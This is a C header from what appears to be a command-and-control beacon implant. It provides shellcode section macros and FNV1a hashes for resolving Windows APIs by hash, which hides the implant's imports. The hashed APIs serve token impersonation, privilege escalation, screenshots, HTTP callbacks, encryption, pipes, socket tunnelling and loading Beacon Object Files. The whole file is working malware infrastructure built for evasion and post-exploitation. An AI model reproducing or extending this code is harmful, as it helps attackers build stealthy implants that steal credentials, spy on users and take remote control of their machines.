/* beacon/include/Macros.h
 * Compiler helpers, PIC section placement, FNV1a hashes.
 * All hash values are FNV1a-32 over the UPPERCASE function/module name. */

#pragma once

/* ========= [ mingw-w64 / -mno-sse workaround ] ========= */
/* winnt.h pulls in psdk_inc/intrin-impl.h which defines __faststorefence()
 * using __builtin_ia32_sfence - unavailable when -mno-sse is active.
 * Pre-defining the guard macro suppresses that definition entirely. */
#ifndef __INTRINSIC_DEFINED___faststorefence
#define __INTRINSIC_DEFINED___faststorefence
#endif

/* ========= [ section placement ] ========= */
#define D_SEC( x )  __attribute__( ( section( ".text$" #x ) ) )
#define FUNC        D_SEC( B )

/* ========= [ function pointer declaration ] ========= */
/* Usage: D_API( VirtualAlloc ) expands to __typeof__(VirtualAlloc) *VirtualAlloc; */
#define D_API( x )  __typeof__( x ) * x

/* ========= [ pointer helpers ] ========= */
#define C_PTR( x )  ( ( PVOID    )( UINT_PTR )( x ) )
#define U_PTR( x )  ( ( UINT_PTR )( x ) )
#define B_PTR( x )  ( ( PBYTE    )( UINT_PTR )( x ) )

/* ========= [ memory helpers ] ========= */
#define MmCopy( d, s, n )  __builtin_memcpy( (d), (s), (n) )
#define MmZero( d, n )     __builtin_memset( (d), 0,   (n) )

/* ========= [ FNV1a-32 hashes (uppercase input) ] ========= */

/* Module names */
#define H_NTDLL_DLL       0x145370BBu
#define H_KERNEL32_DLL    0x29CDD463u
#define H_WINHTTP_DLL     0xD7735323u
#define H_BCRYPT_DLL      0x5BEDF6A5u
#define H_IPHLPAPI_DLL    0xDB411E4Au
#define H_ADVAPI32_DLL    0x35C841F5u
#define H_MSVCRT_DLL      0x1DDEBB66u  

/* ntdll.dll exports */
#define H_LDRREGISTERDLLNOTIFICATION   0x45F4C843u
#define H_LDRUNREGISTERDLLNOTIFICATION 0x24E3DB7Eu
#define H_RTLALLOCATEHEAP     0x1AFF0438u
#define H_RTLFREEHEAP         0x9D9B8AB5u
#define H_RTLEXITUSERTHREAD   0xCC77997Eu
#define H_DBGPRINT             0xEF42EB8Bu   /* DbgPrint */
#define H_NTOPENPROCESSTOKEN   0x06E571ADu   /* NtOpenProcessToken */
#define H_NTQUERYINFORMATIONTOKEN   0x95047682u  /* NtQueryInformationToken */
#define H_NTQUERYINFORMATIONPROCESS 0x69925B6Au  /* NtQueryInformationProcess */
#define H_NTCLOSE              0x1498D8A5u   /* NtClose */
#define H_NTQUERYSYSTEMINFORMATION 0x37072D8Au  /* NtQuerySystemInformation */
#define H_NTQUERYVIRTUALMEMORY     0x315E365Fu  /* NtQueryVirtualMemory */
#define H_NTOPENPROCESS        0x3ED17B38u  /* NtOpenProcess */
#define H_NTTERMINATEPROCESS       0xB931F2E7u  /* NtTerminateProcess */
#define H_NTSETINFORMATIONPROCESS  0x81BADCAAu  /* NtSetInformationProcess */

/* kernel32.dll exports */
#define H_GETCURRENTPROCESSID  0xC36D7CE0u
#define H_GETCURRENTTHREADID   0xF388A295u
#define H_GETCOMPUTERNAMEEXW   0x8DD6527Du
#define H_EXITPROCESS          0xAC392D5Au
#define H_SLEEP                0x6D3D9A28u
#define H_LOADLIBRARYW         0xD76CCD99u
#define H_WIDECHARTOMULTIBYTE  0x4AF2783Eu
#define H_MULTIBYTETOWIDECHAR  0xB2996B82u
#define H_GLOBALFREE           0xF8D3360Cu
#define H_CREATEDIRECTORYA     0xC0A3F6F3u  /* CreateDirectoryA */
#define H_SETCURRENTDIRECTORYA 0xB71F9262u  /* SetCurrentDirectoryA */
#define H_GETCURRENTDIRECTORYA 0xEF8CF83Eu  /* GetCurrentDirectoryA */
#define H_CREATEFILEA          0xE84B3A8Eu  /* CreateFileA */
#define H_READFILE             0xBC5C02C3u  /* ReadFile */
#define H_WRITEFILE            0xD6BC7FEAu  /* WriteFile */
#define H_DELETEFILEA          0x3E6F4637u  /* DeleteFileA */
#define H_COPYFILEA            0xC7C10569u  /* CopyFileA */
#define H_MOVEFILEEXA          0x59632232u  /* MoveFileExA */
#define H_CLOSEHANDLE          0x00FEF545u  /* CloseHandle */
#define H_REMOVEDIRECTORYA     0x192454D3u  /* RemoveDirectoryA */
#define H_FINDFIRSTFILEA       0xBDC52C95u  /* FindFirstFileA */
#define H_FINDNEXTFILEA        0x533ED8F8u  /* FindNextFileA  */
#define H_FINDCLOSE            0x3FF09C86u  /* FindClose      */
#define H_GETACP               0x8FB91DB9u  /* GetACP         */
#define H_GETOEMCP             0xF3F6C445u  /* GetOEMCP       */
#define H_CREATEPROCESSA       0xE3EB7329u  /* CreateProcessA */
#define H_CREATEPIPE           0x18FC8AE1u  /* CreatePipe */
#define H_WAITFORSINGLEOBJECT          0x087A5704u  /* WaitForSingleObject */
#define H_WAITFORMULTIPLEOBJECTS       0xE097CA29u  /* WaitForMultipleObjects */
#define H_PEEKNAMEDPIPE                0xD76A4197u  /* PeekNamedPipe */
#define H_CREATENAMEDPIPEA             0x22623B81u  /* CreateNamedPipeA */
#define H_CONNECTNAMEDPIPE             0x2E327346u  /* ConnectNamedPipe */
#define H_DISCONNECTNAMEDPIPE          0xACED8A20u  /* DisconnectNamedPipe */
#define H_SETNAMEDPIPEHANDLESTATE      0xF69E48D3u  /* SetNamedPipeHandleState */
#define H_CREATEEVENTA                 0xE3D89242u  /* CreateEventA */
#define H_SETEVENT                     0x0A5FA231u  /* SetEvent */
#define H_RESETEVENT                   0xF86C8148u  /* ResetEvent */
#define H_GETOVERLAPPEDRESULT          0x9489823Eu  /* GetOverlappedResult */
#define H_CANCELIO                     0x6C5E22DBu  /* CancelIo */
#define H_FLUSHFILEBUFFERS             0xC683B086u  /* FlushFileBuffers */

/* advapi32.dll exports */
#define H_GETUSERNAMEW                 0x3B271BF8u
#define H_GETTOKENINFORMATION          0xEA1753BAu  /* GetTokenInformation */
#define H_LOOKUPACCOUNTSIDA            0x9F5E72E1u  /* LookupAccountSidA  */
#define H_ALLOCATEANDINITIALIZESID     0x04F018F3u  /* AllocateAndInitializeSid */
#define H_INITIALIZESECURITYDESCRIPTOR 0x3B950E88u  /* InitializeSecurityDescriptor */
#define H_SETSECURITYDESCRIPTORDACL    0x39B5A210u  /* SetSecurityDescriptorDacl */
#define H_SETENTRIESINACLA             0x65427AD5u  /* SetEntriesInAclA */
#define H_FREESID                      0x9543E245u  /* FreeSid */
#define H_DUPLICATETOKENEX             0xCCA86C7Eu  /* DuplicateTokenEx */
#define H_IMPERSONATELOGGEDONUSER      0x5D18DD4Au  /* ImpersonateLoggedOnUser */
#define H_REVERTTOSELF                 0xAAE503A8u  /* RevertToSelf */
#define H_LOGONUSERA                   0xAED2941Au  /* LogonUserA */
#define H_ADJUSTTOKENPRIVILEGES        0xC87F17A3u  /* AdjustTokenPrivileges */
#define H_LOOKUPPRIVILEGEVALUEA        0x7206E77Eu  /* LookupPrivilegeValueA */
#define H_LOOKUPPRIVILEGENAMEA         0x155AB538u  /* LookupPrivilegeNameA */
#define H_OPENTHREADTOKEN              0x3F9FFC2Au  /* OpenThreadToken */
#define H_REGCREATEKEYEXW              0x55945DD2u  /* RegCreateKeyExW */
#define H_REGSETVALUEEXW               0x928D78A6u  /* RegSetValueExW */
#define H_REGCLOSEKEY                  0xD91F178Au  /* RegCloseKey */

/* iphlpapi.dll exports */
#define H_GETADAPTERSINFO      0xF3F916E3u

/* winhttp.dll exports */
#define H_WINHTTPOPEN                   0xDE65FA65u
#define H_WINHTTPCONNECT                0x68399F2Du
#define H_WINHTTPOPENREQUEST            0x2C5B8EB2u
#define H_WINHTTPSENDREQUEST            0x186BEAE4u
#define H_WINHTTPRECEIVERESPONSE        0xBE71F421u
#define H_WINHTTPQUERYHEADERS           0xE990A96Fu
#define H_WINHTTPREADDATA               0x2CD17989u
#define H_WINHTTPCLOSEHANDLE            0xA8A76F19u
#define H_WINHTTPCRACKURL               0xDAD03DD6u
#define H_WINHTTPSETOPTION              0x121A377Au
#define H_WINHTTPQUERYOPTION            0xD159A97Au
#define H_WINHTTPQUERYDATAAVAILABLE     0x98141526u

/* bcrypt.dll exports */
#define H_BCRYPTOPENALGORITHMPROVIDER   0x55E27E7Du
#define H_BCRYPTSETPROPERTY             0x4680A508u
#define H_BCRYPTGENERATESYMMETRICKEY    0x9680C51Au
#define H_BCRYPTENCRYPT                 0xF0E24004u
#define H_BCRYPTDECRYPT                 0x45B2AAE0u
#define H_BCRYPTDESTROYKEY              0x97D4FFB6u
#define H_BCRYPTCLOSEALGORITHMPROVIDER  0x19DD9647u
#define H_BCRYPTGENRANDOM               0xFA481CACu

/* msvcrt.dll exports */
#define H_PRINTF                                0xB81DD0EAu  /* printf */

/* user32.dll */
#define H_USER32_DLL                 0x1A58C439u  /* user32.dll */
#define H_GETSYSTEMMETRICS           0x5A58C773u  /* GetSystemMetrics */
#define H_GETDC                      0xAAADEDBEu  /* GetDC */
#define H_RELEASEDC                  0x10824D97u  /* ReleaseDC */

/* gdi32.dll */
#define H_GDI32_DLL                  0xAD22D412u  /* gdi32.dll */
#define H_CREATECOMPATIBLEDC         0x1C5A0D1Au  /* CreateCompatibleDC */
#define H_CREATECOMPATIBLEBITMAP     0x6891AA50u  /* CreateCompatibleBitmap */
#define H_SELECTOBJECT               0xE1301202u  /* SelectObject */
#define H_BITBLT                     0x6FB8AACEu  /* BitBlt */
#define H_GETDIBITS                  0x9935CA08u  /* GetDIBits */
#define H_DELETEOBJECT               0xCFDED101u  /* DeleteObject */
#define H_DELETEDC                   0x749F876Bu  /* DeleteDC */

/* kernel32 additions for BOF proxy + download */
#define H_GETMODULEHANDLEA           0xA2AE8F7Cu  /* GetModuleHandleA */
#define H_FREELIBRARY                0x9CE6498Eu  /* FreeLibrary      */
#define H_LOADLIBRARYEXW             0x5D45A5C2u  /* LoadLibraryExW   */
#define H_VIRTUALPROTECT             0x62C5C373u  /* VirtualProtect   */
#define H_GETFILESIZE                0x7C072ED8u  /* GetFileSize */
#define H_GETLASTERROR               0x84BD9597u  /* GetLastError */
#define H_GETPROCESSMITIGATIONPOLICY 0x7BC86641u  /* GetProcessMitigationPolicy */
#define H_SETFILEATTRIBUTESA         0x016537C7u  /* SetFileAttributesA */

/* kernelbase.dll */
#define H_KERNELBASE_DLL             0x91624877u
#define H_SETPROCESSVALIDCALLTARGETS 0xDD31D9C4u  /* SetProcessValidCallTargets */

/* ========= [ debug print ] ========= */
/* __FILENAME__: compile-time basename of __FILE__ via builtin_strrchr.
 * The pointer arithmetic is evaluated at compile time; no runtime cost.
 * In release builds the entire DPRINT block compiles away - __FILENAME__
 * is never referenced and no string literal ends up in .rdata.          */
#define __FILENAME__ \
    ( __builtin_strrchr( __FILE__, '\\' ) \
        ? __builtin_strrchr( __FILE__, '\\' ) + 1 \
        : ( __builtin_strrchr( __FILE__, '/' ) \
              ? __builtin_strrchr( __FILE__, '/' ) + 1 \
              : __FILE__ ) )

/* ========= [ debug print helpers ] ========= */
/* Unique name helpers for static-local format string variables.
 * _NX_CONCAT(a, b) → a##b, evaluated in two steps to force __LINE__ expansion. */
#define _NX_C2( a, b )      a##b
#define _NX_CONCAT( a, b )  _NX_C2( a, b )

#ifdef DEBUG_PIC
/* PIC-safe debug: format strings are static locals placed in .text$B via a
 * section attribute, so no string data lands in .rdata.  __FILE__ and
 * __FUNCTION__ are intentionally omitted - they produce .rodata literals that
 * break .text-only shellcode.  __LINE__ gives each static a unique name within
 * its translation unit so multiple calls in the same file never collide.
 *
 * NaxDbgx - DbgPrint (ntdll, visible in DebugView / x64dbg).
 * NaxDbg  - msvcrt!printf (visible in console / CRT debugger).             */
#define __FILENAME__  (__builtin_strrchr(__FILE__, '\\') ? \
                       __builtin_strrchr(__FILE__, '\\') + 1 : \
                       (__builtin_strrchr(__FILE__, '/') ? \
                        __builtin_strrchr(__FILE__, '/') + 1 : __FILE__))

#define NaxDbgx( Nax, fmt, ... ) \
    do { \
        static const char _NX_CONCAT( _nfmt_, __LINE__ )[] \
            __attribute__( ( section( ".text$Bd" ), used ) ) = \
            "[NaX::%s::%s::%d] => " fmt "\n"; \
        if ( ( Nax ) && ( Nax )->Ntdll.DbgPrint ) \
            (void)( Nax )->Ntdll.DbgPrint( \
                _NX_CONCAT( _nfmt_, __LINE__ ), \
                __FILENAME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ ); \
    } while ( 0 )

#define NaxDbg( Nax, fmt, ... ) \
    do { \
        static const char _NX_CONCAT( _mfmt_, __LINE__ )[] \
            __attribute__( ( section( ".text$Bd" ), used ) ) = \
            "[NaX::%s::%s::%d] => " fmt "\n"; \
        if ( ( Nax ) && ( Nax )->Msvcrt.printf ) \
            (void)( Nax )->Msvcrt.printf( \
                _NX_CONCAT( _mfmt_, __LINE__ ), \
                __FILENAME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ ); \
    } while ( 0 )

#elif defined( DEBUG )
/* Non-PIC debug exe: full file/func/line prefix, strings go to .rdata.
 * NaxDbgx - DbgPrint (ntdll, visible in DebugView / x64dbg).
 * NaxDbg  - msvcrt!printf (visible in console / CRT debugger).             */
#define NaxDbgx( Nax, fmt, ... ) \
    ( ( Nax ) && ( Nax )->Ntdll.DbgPrint \
        ? ( (void)( Nax )->Ntdll.DbgPrint( \
              "[NaX::%s::%s::%d] => " fmt "\n", \
              __FILENAME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ ) ) \
        : (void)0 )

#define NaxDbg( Nax, fmt, ... ) \
    ( ( Nax ) && ( Nax )->Msvcrt.printf \
        ? ( (void)( Nax )->Msvcrt.printf( \
              "[NaX::%s::%s::%d] => " fmt "\n", \
              __FILENAME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ ) ) \
        : (void)0 )

#else
#define NaxDbgx( Nax, fmt, ... )  ( (void)0 )
#define NaxDbg( Nax, fmt, ... )   ( (void)0 )
#endif

/* ========= [ global instance accessor ] ========= */
/* G_INSTANCE - recover NAX_INSTANCE from TEB->NtTib.ArbitraryUserPointer.
 * Uses NaxCurrentTeb() (Defs.h overlay) because mingw _TEB is opaque.
 * NT_TIB.ArbitraryUserPointer sits at TEB+0x028; the cast is safe.    */
#define G_INSTANCE  PNAX_INSTANCE Nax = \
    (PNAX_INSTANCE)NaxCurrentTeb()->NtTib.ArbitraryUserPointer

/* ===== ntdll thread pool + critical section ===== */
#define H_TPALLOCWORK                    0x626981afu
#define H_TPPOSTWORK                     0x77d8b8e6u
#define H_TPRELEASEWORK                  0x18b7bcafu
#define H_RTLINITIALIZECRITICALSECTION   0x2609832du
#define H_RTLENTERCRITICALSECTION        0x39ad70efu
#define H_RTLLEAVECRITICALSECTION        0x56e886f8u
#define H_RTLTRYENTERCRITICALSECTION     0x9010ae00u
#define H_RTLDELETECRITICALSECTION       0x5cf633fau

/* ===== kernel32 threading ===== */
#define H_CREATETHREAD                   0x390a6579u
#define H_TERMINATETHREAD                0xab268abcu
#define H_GETTICKCOUNT64                 0xb6f9b737u
#define H_GETCURRENTTHREAD               0x3a773de8u
#define H_DUPLICATEHANDLE                0x84a0a8d0u
#define H_GETCURRENTPROCESS              0xc75b7345u

/* ===== ntdll NT API (added for BOF execution) ===== */
#define H_NTALLOCATEVIRTUALMEMORY    0xD58D5A18u  /* NtAllocateVirtualMemory */
#define H_NTPROTECTVIRTUALMEMORY     0x069FF566u  /* NtProtectVirtualMemory  */
#define H_NTFREEVIRTUALMEMORY        0x8A45BA47u  /* NtFreeVirtualMemory     */
#define H_RTLADDFUNCTIONTABLE        0xAA532C08u  /* RtlAddFunctionTable     */
#define H_RTLDELETEFUNCTIONTABLE     0x9D3FF94Au  /* RtlDeleteFunctionTable  */
#define H__VSNPRINTF                 0x193ECBC2u  /* _vsnprintf              */

/* ===== kernel32 (BOF dynamic Win32 resolution) ===== */
#define H_LOADLIBRARYA               0xE96CE9EFu  /* LoadLibraryA            */
#define H_GETPROCADDRESS             0x12D71805u  /* GetProcAddress           */

/* ===== Beacon API table hashes (FNV1a of function name, no __imp_ prefix) ===== */
#define H_BOF_BEACONDATAPARSE        0xF50B7120u
#define H_BOF_BEACONDATAINT          0xE04B32FAu
#define H_BOF_BEACONDATASHORT        0xDFCDEB61u
#define H_BOF_BEACONDATALENGTH       0x83077BB1u
#define H_BOF_BEACONDATAEXTRACT      0x67BD9D82u
#define H_BOF_BEACONOUTPUT           0x65561DB0u
#define H_BOF_BEACONPRINTF           0x5CD69236u
#define H_BOF_BEACONISADMIN          0xF626BAF8u
#define H_BOF_BEACONFORMATALLOC      0xC823D737u
#define H_BOF_BEACONFORMATRESET      0xE62F39D9u
#define H_BOF_BEACONFORMATFREE       0x43327794u
#define H_BOF_BEACONFORMATAPPEND     0xA9422B42u
#define H_BOF_BEACONFORMATPRINTF     0x97E3AE55u
#define H_BOF_BEACONFORMATTOSTRING   0xE4BFBF6Eu
#define H_BOF_BEACONFORMATINT        0xD81013B7u

/* ===== Additional Beacon API (from beacon.h additions) ===== */
#define H_BOF_BEACONDATAPTR          0x87CE7C1Du  /* BeaconDataPtr             */
#define H_BOF_BEACONUSETOKEN         0xEEBAA4E5u  /* BeaconUseToken            */
#define H_BOF_BEACONREVERTTOKEN      0x95FE635Cu  /* BeaconRevertToken         */
#define H_BOF_BEACONGETSPAWNTO       0x83125743u  /* BeaconGetSpawnTo          */
#define H_BOF_BEACONINFORMATION      0x4A788379u  /* BeaconInformation         */
#define H_BOF_TOWIDECHAR             0x76F95C03u  /* toWideChar                */

/* ===== Adaptix-extension Beacon API (adaptix.h) ===== */
#define H_BOF_AXADDSCREENSHOT        0x7B379A8Bu  /* AxAddScreenshot           */
#define H_BOF_AXDOWNLOADMEMORY       0x177559E7u  /* AxDownloadMemory          */
/* Async BOF APIs */
#define H_BOF_BEACONWAKEUP                   0xde6f5ab4u
#define H_BOF_BEACONGETSTOPJOBEVENT          0x6e7db176u
/* BOF key-value store */
#define H_BOF_BEACONADDVALUE         0x636D6BD1u  /* BeaconAddValue            */
#define H_BOF_BEACONGETVALUE         0x64630FB8u  /* BeaconGetValue            */
#define H_BOF_BEACONREMOVEVALUE      0x41B9FB76u  /* BeaconRemoveValue         */
#define H_BOF_GETPROCESSHEAP         0x36C75DF2u  /* GetProcessHeap            */
/* BOF proxy functions - bare LoadLibraryA/GetProcAddress/etc. (no MODULE$ prefix) */
#define H_BOF_LOADLIBRARYA           0xE96CE9EFu  /* LoadLibraryA              */
#define H_BOF_GETPROCADDRESS         0x12D71805u  /* GetProcAddress            */
#define H_BOF_GETMODULEHANDLEA       0xA2AE8F7Cu  /* GetModuleHandleA          */
#define H_BOF_FREELIBRARY            0x9CE6498Eu  /* FreeLibrary               */

/* ===== beacon private heap management ===== */
#define H_HEAPCREATE   0xF6BF1E07u  /* HeapCreate  */
#define H_HEAPDESTROY  0x7ACACAAFu  /* HeapDestroy */

/* ===== ws2_32.dll (tunnel support, loaded lazily) ===== */
#define H_WS2_32_DLL                     0x5ECCCD63u
#define H_WSASTARTUP                     0xB543F11Fu
#define H_WSACLEANUP                     0x28729B02u
#define H_WSAGETLASTERROR                0x15818D3Cu
#define H_SOCKET_FN                      0x6DBCB3ECu  /* socket         */
#define H_CLOSESOCKET                    0x71F47D22u
#define H_CONNECT_FN                     0x782B3CD9u  /* connect        */
#define H_BIND_FN                        0x7387766Eu  /* bind           */
#define H_LISTEN_FN                      0x84AF5CA6u  /* listen         */
#define H_ACCEPT_FN                      0x209E17E9u  /* accept         */
#define H_SEND_FN                        0xB051CE6Fu  /* send           */
#define H_RECV_FN                        0x2A36852Du  /* recv           */
#define H_SELECT_FN                      0xB4293AADu  /* select         */
#define H_IOCTLSOCKET                    0xAF87B2FFu
#define H_HTONS                          0x1A670BB5u
#define H_NTOHS                          0x5D88A761u
#define H_INET_ADDR                      0x52A5D3B3u
#define H_GETHOSTBYNAME                  0x76E0C5A3u
#define H_SETSOCKOPT                     0x1147B2C8u
#define H_SHUTDOWN_FN                    0x98AE7DCBu  /* shutdown       */
#define H_WSACREATEEVENT                 0x5E2A89DAu
#define H_WSACLOSEEVENT                  0x2FED8392u
#define H_WSAEVENTSELECT                 0xB709ABEEu
#define H_WSARESETEVENT                  0x024F6B57u
#define H_WSAENUMNETWORKEVENTS           0x4B2730B6u
